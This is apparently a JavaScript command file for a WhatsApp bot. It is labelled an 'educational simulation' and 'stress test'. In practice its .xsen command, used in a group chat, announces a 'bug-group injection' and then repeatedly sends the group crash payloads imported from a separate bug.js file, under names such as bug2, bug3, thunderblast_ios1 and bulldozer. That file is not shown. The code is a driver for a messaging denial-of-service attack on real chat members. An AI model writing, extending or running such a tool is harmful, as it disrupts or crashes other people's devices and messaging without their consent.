/**
 * 𝗦𝗘𝗡 Bot - XSen Command (Simulation éducative)
 * Copyright (c) 2024 𝙎𝙏𝙀𝙋𝙃𝘿𝙀𝙑
 */

import { bug3, test, thunderblast_ios1, allProtocol, apaya, bulldozer, alldelay, bug2 } from './bug.js';

// Fonction sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Commande .xsen - Simulation de stress test
 */
export async function xsenCommand(sock, chatId, message, args) {
    try {
        // Vérifier si c'est un groupe
        if (!chatId.endsWith('@g.us')) {
            return await sock.sendMessage(chatId, { 
                text: '❌ Cette commande ne fonctionne que dans les groupes.' 
            }, { quoted: message });
        }

        const target = chatId;

        // Message initial
        await sock.sendMessage(
            target,
            {
                image: { url: "https://files.catbox.moe/0jbnsm.jpg" },
                caption: `🥷🏾 Injection de bug-group 🔞\n\n> by Knut`
            },
            { quoted: message }
        );

        await sleep(1500);

        // Séquence de tests
        await apaya(sock, target);
        await sleep(500);

        await alldelay(sock, target);
        await sleep(1000);

        await bulldozer(sock, target);
        await sleep(500);

        await allProtocol(sock, target);
        await sleep(1000);

        await bulldozer(sock, target);
        await sleep(500);
        
        await thunderblast_ios1(sock, target);
        await sleep(500);

        await apaya(sock, target);
        await sleep(500);
        
        await test(message, sock);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(1000);
        
        await bug3(message, sock, target);
        await sleep(500);
        
        await bug3(message, sock, target);
        await sleep(500);
        
        await bug2(message, sock, target);
        await sleep(500);
        
        await bug2(message, sock, target);
        await sleep(500);
        
        await thunderblast_ios1(sock, target);
        await sleep(500);

        await apaya(sock, target);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(1000);

        await thunderblast_ios1(sock, target);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(500);
        
        await thunderblast_ios1(sock, target);
        await sleep(500);

        await apaya(sock, target);
        await sleep(500);
        
        await test(message, sock);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(1000);
        
        await bug3(message, sock, target);
        await sleep(500);
        
        await bug3(message, sock, target);
        await sleep(500);
        
        await bug2(message, sock, target);
        await sleep(500);
        
        await bug2(message, sock, target);
        await sleep(500);
        
        await thunderblast_ios1(sock, target);
        await sleep(500);

        await apaya(sock, target);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(1000);

        await thunderblast_ios1(sock, target);
        await sleep(500);

        await thunderblast_ios1(sock, target);
        await sleep(500);

        // Réaction finale
        await sock.sendMessage(target, { 
            react: { text: "⚡", key: message.key } 
        });

        console.log('✅ XSen test completed');

    } catch (err) {
        console.error("Erreur dans xsen:", err);
        await sock.sendMessage(chatId, {
            text: '❌ Erreur lors de l\'exécution'
        }, { quoted: message });
    }
}

export default { xsenCommand };